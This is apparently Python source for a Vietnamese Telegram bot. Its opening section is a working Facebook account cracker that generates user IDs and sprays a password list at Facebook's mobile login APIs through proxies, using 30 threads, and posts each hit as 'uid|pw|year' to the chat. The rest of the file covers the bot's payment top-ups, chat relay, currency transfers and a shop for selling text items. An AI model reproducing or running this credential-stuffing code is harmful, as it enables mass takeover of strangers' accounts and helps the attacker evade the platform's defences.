def _safe_json(response) -> dict:
    """Trả dict dù response là json hay lỗi."""
    try:
        return response.json()
    except Exception:
        return {}

def _fb_check_result(res: dict) -> bool:
    """Kiểm tra response có nghĩa là đăng nhập được không."""
    if not isinstance(res, dict):
        return False
    # Thành công rõ ràng
    if "session_key" in res or "access_token" in res:
        return True
    # Một số API trả lỗi "wrong password" → sai mật khẩu
    # Lỗi "account locked/checkpoint" → UID tồn tại nhưng cần xác minh
    err = res.get("error", {})
    if isinstance(err, dict):
        code    = err.get("code", 0)
        subcode = err.get("error_subcode", 0)
        msg     = err.get("message", "").lower()
        # code 401 subcode 458/459 = checkpoint (account exists)
        if code == 401 and subcode in (458, 459):
            return True
        # Mật khẩu sai hoặc cần 2FA → UID valid nhưng không đăng nhập được
        if "wrong" in msg or "incorrect" in msg:
            return False
    return False

def _fb_login_a(uid: str, pw: str, gp: dict | None) -> dict:
    """Method A — POST b-graph.facebook.com."""
    session = requests.Session()
    if gp:
        session.proxies.update(gp)
    post_data = {
        "adid":                    str(uuid.uuid4()),
        "format":                  "json",
        "device_id":               str(uuid.uuid4()),
        "cpl":                     "true",
        "family_device_id":        str(uuid.uuid4()),
        "credentials_type":        "device_based_login_password",
        "error_detail_type":       "button_with_disabled",
        "source":                  "device_based_login",
        "email":                   uid,
        "password":                pw,
        "access_token":            _FB_ACCESS_TOKEN,
        "generate_session_cookies":"1",
        "locale":                  "en_US",
        "client_country_code":     "US",
        "method":                  "auth.login",
        "fb_api_req_friendly_name":"authenticate",
        "api_key":                 "882a8490361da98702bf97a021ddc14d",
    }
    headers = {
        "User-Agent":   _FB_UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "X-FB-HTTP-Engine": "Liger",
        "Accept":       "application/json",
    }
    r = session.post(
        "https://b-graph.facebook.com/auth/login",
        data=post_data, headers=headers,
        allow_redirects=False, timeout=15,
    )
    return _safe_json(r)

def _fb_login_b(uid: str, pw: str, gp: dict | None) -> dict:
    """Method B — GET b-api.facebook.com."""
    session = requests.Session()
    if gp:
        session.proxies.update(gp)
    headers = {
        "x-fb-connection-quality": "EXCELLENT",
        "user-agent":              _FB_UA,
        "content-type":            "application/x-www-form-urlencoded",
        "x-fb-http-engine":        "Liger",
    }
    url = (
        f"https://b-api.facebook.com/method/auth.login"
        f"?format=json&email={uid}&password={pw}"
        f"&credentials_type=device_based_login_password"
        f"&generate_session_cookies=1&locale=en_US"
        f"&client_country_code=US&access_token={_FB_ACCESS_TOKEN}"
    )
    r = session.get(url, headers=headers, timeout=15)
    return _safe_json(r)

def _fb_scan_one(uid: str, method: str, gp: dict | None) -> str | None:
    """
    Thử đăng nhập với uid + danh sách mật khẩu.
    Trả về "uid|pw|year" nếu thành công, None nếu không.
    """
    login_fn = _fb_login_a if method == "A" else _fb_login_b
    for pw in _FB_PASSWORDS:
        try:
            res = login_fn(uid, pw, gp)
            if _fb_check_result(res):
                year = _fb_creation_year(uid)
                return f"{uid}|{pw}|{year}"
        except Exception:
            pass
    return None

# Lock để ghi oks thread-safe
_fb_lock = threading.Lock()

def fb_scan_task(chat_id: int, mode: str, total: int, method: str,
                 bot, stop_event: threading.Event, loop) -> None:
    """
    Quét FB chạy trong thread riêng.
    Gửi kết quả NGAY khi tìm được, không trùng lặp.
    """
    gp = get_proxy_dict_for_scan()
    found = 0
    scanned = 0

    def _do_one(uid):
        nonlocal found, scanned
        if stop_event.is_set():
            return
        result = _fb_scan_one(uid, method, gp)
        with _fb_lock:
            scanned += 1
            if result:
                found += 1
                asyncio.run_coroutine_threadsafe(
                    bot.send_message(
                        chat_id,
                        f"✅ *Tìm được!*\n`{result}`",
                        parse_mode="Markdown"
                    ), loop
                )

    uids = []
    for _ in range(total):
        uid = _fb_gen_uid(mode)
        if uid:
            uids.append(uid)

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(_do_one, uid): uid for uid in uids}
        for fut in concurrent.futures.as_completed(futures):
            if stop_event.is_set():
                executor.shutdown(wait=False, cancel_futures=True)
                break
            try:
                fut.result()
            except Exception:
                pass

    asyncio.run_coroutine_threadsafe(
        bot.send_message(
            chat_id,
            f"🏁 Hoàn tất!\nQuét: {scanned}/{total} | Tìm được: {found}"
        ), loop
    )

# ==================== NẠP IZE — FIX VIETQR ====================
def generate_vietqr(so_tai_khoan, ten_chu_tk, ma_bin, so_tien, noi_dung):
    # FIX: dùng vietqr.io (API chính thức, trả về ảnh PNG, không bị 400)
    ten_enc = quote(str(ten_chu_tk).strip())
    noi_enc = quote(str(noi_dung)[:25].strip())
    return (f"https://img.vietqr.io/image/{ma_bin}-{so_tai_khoan}-compact2.png"
            f"?amount={so_tien}&addInfo={noi_enc}&accountName={ten_enc}")

async def cmd_nap(update, context):
    uid = update.effective_user.id
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    if not context.args:
        await update.message.reply_text("📝 Dùng: /nap <số VND> (tối thiểu 1,000)\nTỷ giá: 1 VND = 1 IZE"); return
    try: amount = parse_money(context.args[0])
    except Exception: await update.message.reply_text("❌ Số tiền không hợp lệ."); return
    if amount < 1000: await update.message.reply_text("❌ Tối thiểu 1,000 VND."); return
    ud = user_data_store.setdefault(str(uid), {})
    nap_code = ud.get("nap_code", f"NAP{uid}"); ud["nap_code"] = nap_code; save_all_data()
    nap_requests[uid] = {"amount":amount,"content":nap_code,"time":time.time(),"checked":False}
    qr_url = generate_vietqr(SEPAY_ACCOUNT_NUMBER,"IZE BOT",SEPAY_BIN,amount,nap_code)
    caption = (f"🏦 *Nạp IZE qua MB Bank*\n"
               f"💰 Số tiền: {format_money(amount)}\n"
               f"💠 Sẽ nhận: {format_ize(amount // NAP_RATE)}\n"
               f"📝 Nội dung CK: `{nap_code}`\n"
               f"⚠️ *Chuyển đúng nội dung và số tiền!*")
    try: await update.message.reply_photo(photo=qr_url, caption=caption, parse_mode="Markdown")
    except Exception: await update.message.reply_text(caption + f"\n[📱 QR]({qr_url})", parse_mode="Markdown")

async def cmd_mynapcode(update, context):
    uid = update.effective_user.id
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    ud = user_data_store.get(str(uid), {})
    nap_code = ud.get("nap_code", f"NAP{uid}")
    if "nap_code" not in ud: user_data_store.setdefault(str(uid),{})["nap_code"] = nap_code; save_all_data()
    await update.message.reply_text(f"📝 Mã nạp: `{nap_code}`", parse_mode="Markdown")

async def check_nap_transactions(context):
    if not SEPA_API_TOKEN: return
    headers = {"Authorization":f"Bearer {SEPA_API_TOKEN}","Content-Type":"application/json"}
    try:
        r = requests.get("https://my.sepay.vn/userapi/transactions/list",headers=headers,
                         params={"account_number":SEPAY_ACCOUNT_NUMBER,"limit":20},timeout=10)
        if r.status_code != 200: return
        for txn in r.json().get("transactions",[]):
            amount_in = float(txn.get("amount_in",0))
            if amount_in <= 0: continue
            txn_content = txn.get("transaction_content","")
            for uid, nap in list(nap_requests.items()):
                if nap["checked"]: continue
                if nap["content"] in txn_content and amount_in == float(nap["amount"]):
                    ize_amount = int(amount_in) // NAP_RATE
                    if ize_amount > 0:
                        get_user_game_data(uid)["ize_balance"] += ize_amount; save_all_data()
                        try: await context.bot.send_message(uid, f"✅ Đã nhận {format_money(int(amount_in))}\n💠 +{format_ize(ize_amount)}")
                        except Exception: pass
                    nap["checked"] = True; nap_requests.pop(uid, None)
    except Exception as e: logger.error(f"SePay: {e}")

# ==================== CHAT ====================
def chat_display_name(uid):
    if uid in chat_state["anon_users"]: return "Ẩn danh"
    info = user_data_store.get(str(uid),{}).get("profile",{})
    if info.get("username"): return f"@{info['username']}"
    name = (info.get("first_name","")+" "+info.get("last_name","")).strip()
    return name if name else f"ID:{uid}"

async def chat_relay(context, sender_id, text):
    for uid in chat_state["users"]:
        if uid == sender_id: continue
        try:
            msg = await context.bot.send_message(uid, text)
            chat_state["messages"].setdefault(str(sender_id),[]).append({"chat_id":uid,"message_id":msg.message_id})
        except Exception: pass

async def chat_broadcast_msg(context, text):
    for uid in chat_state["users"]:
        try: await context.bot.send_message(uid, text)
        except Exception: pass

async def cmd_chat(update, context):
    uid = update.effective_user.id
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    chat_state["users"].add(uid); chat_state["active"] = True
    kb = [
        [InlineKeyboardButton("👻 Ẩn danh", callback_data="chat_anon"),
         InlineKeyboardButton("🚪 Thoát", callback_data="chat_leave")],
        [InlineKeyboardButton("🗑 Xóa tin của tôi", callback_data="chat_rm_self")],
        [InlineKeyboardButton("✉️ Nhắn riêng", callback_data="chat_ib")],
    ]
    if is_admin(uid): kb.append([InlineKeyboardButton("👮 Xóa tin người khác", callback_data="chat_rm_other")])
    await update.message.reply_text("💬 *Đã vào Chat Relay*", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))
    await chat_broadcast_msg(context, f"📢 {chat_display_name(uid)} đã tham gia chat.")

async def chat_callback(update, context):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id; data = q.data
    if data == "chat_anon":
        if uid in chat_state["anon_users"]: chat_state["anon_users"].discard(uid); await q.edit_message_text("✅ Đã hiện tên.")
        else: chat_state["anon_users"].add(uid); await q.edit_message_text("👻 Đã ẩn danh.")
    elif data == "chat_leave":
        chat_state["users"].discard(uid); await q.edit_message_text("🚪 Đã thoát chat.")
        await chat_broadcast_msg(context, f"👋 {chat_display_name(uid)} đã rời chat.")
        if not chat_state["users"]: chat_state["active"] = False
    elif data == "chat_rm_self":
        deleted = 0
        for item in chat_state["messages"].get(str(uid),[]):
            try: await context.bot.delete_message(item["chat_id"],item["message_id"]); deleted += 1
            except Exception: pass
        chat_state["messages"][str(uid)] = []
        await q.answer(f"Đã xóa {deleted} tin.", show_alert=True)
    elif data == "chat_rm_other":
        if not is_admin(uid): await q.answer("Chỉ admin.", show_alert=True); return
        context.user_data["expect_chat_rm"] = True; await q.edit_message_text("✏️ ID/@username cần xóa tin:")
    elif data == "chat_ib":
        context.user_data["expect_chat_ib"] = True; await q.edit_message_text("✏️ Nhập: <id/@username> <nội dung>")

async def handle_chat_text(update, context):
    uid = update.effective_user.id; txt = update.message.text.strip()
    if context.user_data.get("expect_chat_rm"):
        context.user_data.pop("expect_chat_rm"); target_id = _resolve_user(txt)
        if not target_id: await update.message.reply_text("❌ Không tìm thấy."); return
        deleted = 0
        for item in chat_state["messages"].get(str(target_id),[]):
            try: await context.bot.delete_message(item["chat_id"],item["message_id"]); deleted += 1
            except Exception: pass
        chat_state["messages"][str(target_id)] = []
        await update.message.reply_text(f"✅ Đã xóa {deleted} tin."); return
    if context.user_data.get("expect_chat_ib"):
        context.user_data.pop("expect_chat_ib"); parts = txt.split(maxsplit=1)
        if len(parts) < 2: await update.message.reply_text("❌ Thiếu nội dung."); return
        target_id = _resolve_user(parts[0])
        if not target_id: await update.message.reply_text("❌ Không tìm thấy."); return
        try: await context.bot.send_message(target_id, f"📩 *{chat_display_name(uid)} nhắn riêng:*\n{parts[1]}", parse_mode="Markdown")
        except Exception as e: await update.message.reply_text(f"❌ Lỗi: {e}")
        return
    await chat_relay(context, uid, f"💬 {chat_display_name(uid)}: {txt}")
    try: await update.message.delete()
    except Exception: pass

# ==================== IZE ====================
async def cmd_convert(update, context):
    uid = update.effective_user.id
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    if not context.args: await update.message.reply_text("Dùng: /convert <số VND>"); return
    try: amount = parse_money(context.args[0])
    except Exception: await update.message.reply_text("Số không hợp lệ."); return
    if amount < 1000: await update.message.reply_text("Tối thiểu 1,000 VND."); return
    g = get_user_game_data(uid)
    if g["balance"] < amount: await update.message.reply_text(f"❌ Không đủ VND. Có: {format_money(g['balance'])}"); return
    ize = amount // 1000; remain = amount % 1000
    g["balance"] -= amount; g["ize_balance"] += ize; g["balance"] += remain; save_all_data()
    await update.message.reply_text(f"✅ Đổi {format_money(amount)} → {format_ize(ize)}\nVND: {format_money(g['balance'])}\nIZE: {format_ize(g['ize_balance'])}")

async def cmd_convertize(update, context):
    uid = update.effective_user.id
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    if not context.args: await update.message.reply_text("Dùng: /convertize <số IZE>"); return
    try: ize = int(context.args[0])
    except Exception: await update.message.reply_text("Số không hợp lệ."); return
    if ize <= 0: await update.message.reply_text(">0."); return
    g = get_user_game_data(uid)
    if g["ize_balance"] < ize: await update.message.reply_text(f"❌ Không đủ IZE. Có: {format_ize(g['ize_balance'])}"); return
    vnd = ize * 1000; g["ize_balance"] -= ize; g["balance"] += vnd; save_all_data()
    await update.message.reply_text(f"✅ Đổi {format_ize(ize)} → {format_money(vnd)}\nVND: {format_money(g['balance'])}\nIZE: {format_ize(g['ize_balance'])}")

async def cmd_ize(update, context):
    uid = update.effective_user.id
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    g = get_user_game_data(uid)
    await update.message.reply_text(f"💠 IZE: {format_ize(g['ize_balance'])}\n💰 VND: {format_money(g['balance'])}")

# ==================== HELPER: resolve user ====================
def _resolve_user(target):
    if target.startswith("@"):
        uname = target[1:].lower()
        for k, v in user_data_store.items():
            if k in ("blacklist","owner","bot_enabled","keys","top_reset_date","shop_items"): continue
            if isinstance(v, dict) and v.get("profile",{}).get("username","").lower() == uname: return int(k)
        return None
    try: return int(target)
    except Exception: return None

# ==================== OWNER CMDS ====================
async def _owner_only(update):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Chỉ chủ bot mới có quyền này."); return False
    return True

async def cmd_giftize(update, context):
    if not await _owner_only(update): return
    if len(context.args) < 2: await update.message.reply_text("/giftize <id/@username> <số IZE>"); return
    try: amount = int(context.args[1])
    except Exception: await update.message.reply_text("Số IZE không hợp lệ."); return
    rid = _resolve_user(context.args[0])
    if not rid: await update.message.reply_text("❌ Không tìm thấy."); return
    get_user_game_data(rid)["ize_balance"] += amount; save_all_data()
    try: await context.bot.send_message(rid, f"🎁 Chủ bot tặng {format_ize(amount)}.")
    except Exception: pass
    await update.message.reply_text(f"✅ Tặng {format_ize(amount)} cho {context.args[0]}.")

async def cmd_rmbank(update, context):
    if not await _owner_only(update): return
    if len(context.args) < 2: await update.message.reply_text("/rmbank <id/@username> <số IZE>"); return
    try: amount = int(context.args[1])
    except Exception: await update.message.reply_text("Số không hợp lệ."); return
    rid = _resolve_user(context.args[0])
    if not rid: await update.message.reply_text("❌ Không tìm thấy."); return
    g = get_user_game_data(rid)
    if g["ize_balance"] < amount: await update.message.reply_text(f"❌ Chỉ có {format_ize(g['ize_balance'])}"); return
    g["ize_balance"] -= amount; save_all_data()
    try: await context.bot.send_message(rid, f"⚠️ Chủ bot trừ {format_ize(amount)} IZE.")
    except Exception: pass
    await update.message.reply_text(f"✅ Trừ {format_ize(amount)} IZE của {context.args[0]}.")

async def cmd_rmvnd(update, context):
    if not await _owner_only(update): return
    if len(context.args) < 2: await update.message.reply_text("/rmvnd <id/@username> <số VND>"); return
    try: amount = parse_money(context.args[1])
    except Exception: await update.message.reply_text("Số không hợp lệ."); return
    rid = _resolve_user(context.args[0])
    if not rid: await update.message.reply_text("❌ Không tìm thấy."); return
    g = get_user_game_data(rid)
    if g["balance"] < amount: await update.message.reply_text(f"❌ Chỉ có {format_money(g['balance'])}"); return
    g["balance"] -= amount; save_all_data()
    try: await context.bot.send_message(rid, f"⚠️ Chủ bot trừ {format_money(amount)} VND.")
    except Exception: pass
    await update.message.reply_text(f"✅ Trừ {format_money(amount)} VND của {context.args[0]}.")

# ==================== VND (ADMIN) ====================
async def cmd_vnd(update, context):
    if not is_admin(update.effective_user.id): await update.message.reply_text("❌ Không có quyền."); return
    if len(context.args) < 2: await update.message.reply_text("/vnd <id> <số VND>\n/vnd ize <id> <số IZE>"); return
    if context.args[0].lower() == "ize":
        if len(context.args) < 3: return
        try: amount = int(context.args[2])
        except Exception: return
        rid = _resolve_user(context.args[1])
        if not rid: await update.message.reply_text("❌ Không tìm thấy."); return
        get_user_game_data(rid)["ize_balance"] += amount; save_all_data()
        await update.message.reply_text(f"✅ Tặng {format_ize(amount)} IZE cho {context.args[1]}.")
    else:
        try: amount = parse_money(context.args[1])
        except Exception: return
        rid = _resolve_user(context.args[0])
        if not rid: await update.message.reply_text("❌ Không tìm thấy."); return
        get_user_game_data(rid)["balance"] += amount; save_all_data()
        await update.message.reply_text(f"✅ Tặng {format_money(amount)} VND cho {context.args[0]}.")

# ==================== BANK ====================
async def cmd_bank(update, context):
    uid = update.effective_user.id
    ok, amsg = check_antispam(uid)
    if not ok: await update.message.reply_text(amsg); return
    if is_blacklisted(uid): await update.message.reply_text("⛔ Bạn đã bị ban vĩnh viễn."); return
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    if not is_bot_enabled() and not is_owner(uid): await update.message.reply_text("⚠️ Bot tạm dừng."); return
    if len(context.args) < 2: await update.message.reply_text("/bank <id/@username> <số VND>\n/bank ize <id/@username> <số IZE>"); return
    if context.args[0].lower() == "ize":
        if len(context.args) < 3: return
        try: amount = int(context.args[2])
        except Exception: return
        if amount <= 0: return
        sender = get_user_game_data(uid)
        if sender["ize_balance"] < amount: await update.message.reply_text(f"❌ Không đủ IZE. Có: {format_ize(sender['ize_balance'])}"); return
        rid = _resolve_user(context.args[1])
        if not rid: await update.message.reply_text("❌ Không tìm thấy người nhận."); return
        if rid == uid: await update.message.reply_text("❌ Không thể tự chuyển."); return
        recv = get_user_game_data(rid); sender["ize_balance"] -= amount; recv["ize_balance"] += amount; save_all_data()
        try: await context.bot.send_message(rid, f"💰 Nhận {format_ize(amount)} IZE từ {uid}.")
        except Exception: pass
        await update.message.reply_text(f"✅ Chuyển {format_ize(amount)} IZE đến {context.args[1]}.")
    else:
        try: amount = parse_money(context.args[1])
        except Exception: return
        if amount <= 0: return
        sender = get_user_game_data(uid)
        if sender["balance"] < amount: await update.message.reply_text(f"❌ Không đủ VND. Có: {format_money(sender['balance'])}"); return
        rid = _resolve_user(context.args[0])
        if not rid: await update.message.reply_text("❌ Không tìm thấy người nhận."); return
        if rid == uid: await update.message.reply_text("❌ Không thể tự chuyển."); return
        recv = get_user_game_data(rid); sender["balance"] -= amount; recv["balance"] += amount; save_all_data()
        try: await context.bot.send_message(rid, f"💰 Nhận {format_money(amount)} VND từ {uid}.")
        except Exception: pass
        await update.message.reply_text(f"✅ Chuyển {format_money(amount)} VND đến {context.args[0]}.")

# ==================== SHOP ====================
def gen_item_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

async def cmd_shop(update, context):
    uid = update.effective_user.id
    # Yêu cầu key trước khi vào shop
    if not is_owner(uid) and not check_user_key(uid):
        await request_key(update, context)
        return
    if not is_bot_enabled() and not is_owner(uid):
        await update.message.reply_text("⚠️ Bot đang tạm dừng."); return
    kb = [[InlineKeyboardButton("🛒 Mua hàng", callback_data="shop_buy")],
          [InlineKeyboardButton("📋 Xem danh sách", callback_data="shop_list")]]
    if is_admin(uid): kb.append([InlineKeyboardButton("📦 Đăng bán", callback_data="shop_sell")])
    await update.message.reply_text("🏪 *Cửa hàng*", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

async def shop_callback(update, context):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id; data = q.data
    # Yêu cầu key
    if not is_owner(uid) and not check_user_key(uid):
        await q.edit_message_text("🔑 Bạn cần key để dùng cửa hàng.\nGõ /start để nhập key.")
        return
    if data == "shop_list":
        if not shop_items: await q.edit_message_text("📭 Chưa có sản phẩm."); return
        lines = ["📋 *Sản phẩm:*"]
        for i, item in enumerate(shop_items, 1):
            cur = item.get("currency","VND")
            ps = format_money(item["price"]) if cur=="VND" else format_ize(item["price"])
            lines.append(f"{i}. `{item['id']}` — {item['name']} | {ps} | Còn: {item['stock']}")
        await q.edit_message_text("\n".join(lines), parse_mode="Markdown"); return
    if data == "shop_sell":
        if not is_admin(uid): return
        context.user_data["shop_state"] = "sell_count"; context.user_data["sell_items"] = []
        await q.edit_message_text("📦 Nhập số loại sản phẩm muốn đăng:"); return
    if data == "shop_buy":
        context.user_data["shop_state"] = "buy_id"
        await q.edit_message_text("📝 Nhập ID sản phẩm:"); return

async def shop_confirm_callback(update, context):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id; data = q.data
    if not is_owner(uid) and not check_user_key(uid):
        await q.edit_message_text("🔑 Bạn cần key để mua hàng.\nGõ /start để nhập key.")
        return
    if data == "shop_confirm":
        qty = context.user_data.get("buy_qty",1); item = context.user_data.get("buy_item")
        cur = context.user_data.get("buy_currency","VND")
        if not item: return
        total = item["price"] * qty; game = get_user_game_data(uid)
        if cur=="IZE":
            if game["ize_balance"] < total: await q.edit_message_text("❌ Không đủ IZE."); return
            game["ize_balance"] -= total
        else:
            if game["balance"] < total: await q.edit_message_text("❌ Không đủ VND."); return
            game["balance"] -= total
        products_sold = item["products"][:qty]; del item["products"][:qty]; item["stock"] -= qty
        if item["stock"] <= 0: shop_items.remove(item)
        user_data_store["shop_items"] = shop_items; save_all_data()
        product_list = "\n".join(f"• `{p}`" for p in products_sold)
        await q.edit_message_text(f"✅ Mua {qty}x {item['name']}\nSản phẩm:\n{product_list}")
        for k in ("shop_state","buy_item","buy_qty","buy_currency"): context.user_data.pop(k,None)
    elif data == "shop_cancel":
        await q.edit_message_text("❌ Đã hủy.")
        for k in ("shop_state","buy_item","buy_qty","buy_currency"): context.user_data.pop(k,None)

async def handle_shop_input(update, context):
    uid = update.effective_user.id; txt = update.message.text.strip()
    state = context.user_data.get("shop_state")
    if state == "sell_count":
        try:
            count = int(txt)
        except Exception:
            await update.message.reply_text("❌ Số không hợp lệ."); return
            return
        if not (count > 0):
            await update.message.reply_text("❌ Số không hợp lệ."); return
            return
        context.user_data.update({"sell_count":count,"sell_index":1,"shop_state":"sell_name"})
        await update.message.reply_text(f"🔹 Sp 1/{count} — Nhập tên:"); return
    if state == "sell_name":
        context.user_data["sell_name"] = txt; context.user_data["shop_state"] = "sell_currency"
        await update.message.reply_text("💱 Chọn tiền tệ: VND hoặc IZE"); return
    if state == "sell_currency":
        cur = txt.upper()
        if cur not in ("VND","IZE"): await update.message.reply_text("❌ Chỉ VND hoặc IZE."); return
        context.user_data["sell_currency"] = cur; context.user_data["shop_state"] = "sell_price"
        await update.message.reply_text(f"💰 Nhập giá ({cur}):"); return
    if state == "sell_price":
        try:
            price = parse_money(txt) if context.user_data.get("sell_currency")=="VND" else int(txt)
        except Exception:
            await update.message.reply_text("❌ Giá không hợp lệ."); return
            return
        if not (price >= 0):
            await update.message.reply_text("❌ Giá không hợp lệ."); return
            return
        context.user_data["sell_price"] = price; context.user_data["shop_state"] = "sell_stock"
        await update.message.reply_text("📦 Nhập số lượng tồn:"); return
    if state == "sell_stock":
        try:
            stock = int(txt)
        except Exception:
            await update.message.reply_text("❌ Số lượng không hợp lệ."); return
            return
        if not (stock > 0):
            await update.message.reply_text("❌ Số lượng không hợp lệ."); return
            return
        context.user_data.update({"sell_stock":stock,"shop_state":"sell_products","sell_products":[]})
        await update.message.reply_text(f"📝 Nhập nội dung sản phẩm 1/{stock}:"); return
    if state == "sell_products":
        prods = context.user_data.get("sell_products",[]); prods.append(txt); context.user_data["sell_products"] = prods
        stock = context.user_data["sell_stock"]
        if len(prods) < stock: await update.message.reply_text(f"📝 Nhập sản phẩm {len(prods)+1}/{stock}:"); return
        item = {"id":gen_item_id(),"name":context.user_data["sell_name"],"desc":"",
                "price":context.user_data["sell_price"],"currency":context.user_data.get("sell_currency","VND"),
                "stock":stock,"products":prods,"seller_id":uid}
        shop_items.append(item); user_data_store["shop_items"] = shop_items
        save_global_config()
        idx = context.user_data.get("sell_index",1); total_count = context.user_data.get("sell_count",1)
        if idx < total_count:
            context.user_data.update({"sell_index":idx+1,"shop_state":"sell_name","sell_products":[]})
            await update.message.reply_text(f"✅ Đã đăng SP {idx}. Tiếp tục SP {idx+1}/{total_count} — Nhập tên:")
        else:
            for k in ("shop_state","sell_count","sell_index","sell_name","sell_currency","sell_price","sell_stock","sell_products"):
                context.user_data.pop(k,None)
            await update.message.reply_text(f"✅ Đã đăng bán: {item['name']} (ID: `{item['id']}`)", parse_mode="Markdown")
        return
    if state == "buy_id":
        item = next((it for it in shop_items if it["id"]==txt), None)
        if not item: await update.message.reply_text("❌ Không tìm thấy."); return
        context.user_data.update({"buy_item":item,"shop_state":"buy_qty"})
        await update.message.reply_text(f"📦 Còn {item['stock']}. Nhập số lượng:"); return
    if state == "buy_qty":
        try:
            qty = int(txt)
        except Exception:
            await update.message.reply_text("❌ Số lượng không hợp lệ."); return
            return
        if not (qty > 0):
            await update.message.reply_text("❌ Số lượng không hợp lệ."); return
            return
        item = context.user_data["buy_item"]
        if qty > item["stock"]: await update.message.reply_text("❌ Không đủ hàng."); return
        cur = item.get("currency","VND"); total = item["price"]*qty; game = get_user_game_data(uid)
        if cur=="IZE" and game["ize_balance"] < total: await update.message.reply_text("❌ Không đủ IZE."); return
        if cur=="VND" and game["balance"] < total: await update.message.reply_text("❌ Không đủ VND."); return
        context.user_data.update({"buy_qty":qty,"buy_currency":cur,"shop_state":"confirm"})
        ps = format_money(total) if cur=="VND" else format_ize(total)
        await update.message.reply_text(f"🛒 Xác nhận {qty}x {item['name']} ({ps})?",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ Xác nhận",callback_data="shop_confirm"),
                                                InlineKeyboardButton("❌ Hủy",callback_data="shop_cancel")]])); return

# ==================== TOP ====================
async def cmd_top(update, context):
    uid = update.effective_user.id
    ok, amsg = check_antispam(uid)
    if not ok: await update.message.reply_text(amsg); return
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    today = date.today().isoformat()
    last_reset = user_data_store.get("top_reset_date","2000-01-01")
    try:
        if (date.today() - date.fromisoformat(last_reset)).days >= 7:
            users = []
            for uid_str, data in user_data_store.items():
                if uid_str in ("owner","blacklist","bot_enabled","top_reset_date","shop_items","keys"): continue
                try: users.append((int(uid_str), data.get("game",{}).get("balance",0)))
                except Exception: pass
            users.sort(key=lambda x: x[1], reverse=True)
            for i, (u, _) in enumerate(users[:3]):
                get_user_game_data(u)["balance"] += {0:2_000_000_000,1:1_000_000_000,2:500_000_000}[i]
            for uid_str, data in user_data_store.items():
                if uid_str in ("owner","blacklist","bot_enabled","top_reset_date","shop_items","keys"): continue
                if data.get("game"): data["game"]["balance"] = 0
            user_data_store["top_reset_date"] = today
            await update.message.reply_text("🔄 Reset bảng xếp hạng VND, thưởng top 3! IZE giữ nguyên.")
            save_global_config(); save_all_data()
    except Exception: pass
    users = []
    for uid_str, data in user_data_store.items():
        if uid_str in ("owner","blacklist","bot_enabled","top_reset_date","shop_items","keys"): continue
        try: users.append((int(uid_str), data.get("game",{}).get("balance",0), data.get("game",{}).get("ize_balance",0)))
        except Exception: pass
    users.sort(key=lambda x: x[1], reverse=True)
    lines = ["🏆 *Top 20 VND:*\n"]
    for i, (u, bal, ize) in enumerate(users[:20], 1):
        prof = user_data_store.get(str(u),{}).get("profile",{})
        uname = prof.get("username", str(u))
        lines.append(f"{i}. `{uname}` — {format_money(bal)} | {format_ize(ize)}")
    if not users: lines.append("Chưa có ai.")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

# ==================== KEYBOARDS ====================
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Scan Proxy", callback_data="menu_proxy")],
        [InlineKeyboardButton("🎯 Canh Code XWorld", callback_data="menu_xworld")],
        [InlineKeyboardButton("🎲 Tài Xỉu", callback_data="game_menu")],
        [InlineKeyboardButton("🎮 Scan Acc LQ", callback_data="menu_scanlq")],
        [InlineKeyboardButton("🔓 FB Clone Scanner", callback_data="menu_fb")],
    ])

def proxy_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📁 Check từ file", callback_data="proxy_check_file")],
        [InlineKeyboardButton("⚡ Check auto nhanh", callback_data="proxy_check_auto")],
        [InlineKeyboardButton("🕒 Check sống lâu", callback_data="proxy_check_long")],
        [InlineKeyboardButton("▶️ Bắt đầu quét", callback_data="proxy_start_scan")],
        [InlineKeyboardButton("🛑 Dừng quét", callback_data="proxy_stop_scan")],
    ])

def xworld_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚙️ Cài đặt", callback_data="xw_settings")],
        [InlineKeyboardButton("➕ Thêm Code", callback_data="xw_add_code")],
        [InlineKeyboardButton("▶️ Bắt đầu canh", callback_data="xw_start_monitor")],
        [InlineKeyboardButton("⏹️ Dừng canh", callback_data="xw_stop_monitor")],
    ])

def xw_settings_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Thêm tài khoản", callback_data="xw_add_account")],
        [InlineKeyboardButton("📋 Xem tài khoản", callback_data="xw_view_accounts")],
        [InlineKeyboardButton("🎚️ Đặt ngưỡng", callback_data="xw_set_threshold")],
        [InlineKeyboardButton("🔙 Quay lại", callback_data="menu_xworld")],
    ])

def scan_lq_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔢 Scan số lượng", callback_data="scanlq_quantity")],
        [InlineKeyboardButton("♾️ Scan liên tục", callback_data="scanlq_infinite")],
        [InlineKeyboardButton("🛑 Dừng scan", callback_data="scanlq_stop")],
    ])

def fb_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥 Clone 2010-2014", callback_data="fb_A")],
        [InlineKeyboardButton("🔥 Clone 100003/4", callback_data="fb_B")],
        [InlineKeyboardButton("🔥 Clone 2009", callback_data="fb_C")],
        [InlineKeyboardButton("🛑 Dừng quét", callback_data="fb_stop")],
    ])

# ==================== ADMIN ====================
async def cmd_broadcast(update, context):
    if not is_admin(update.effective_user.id): return
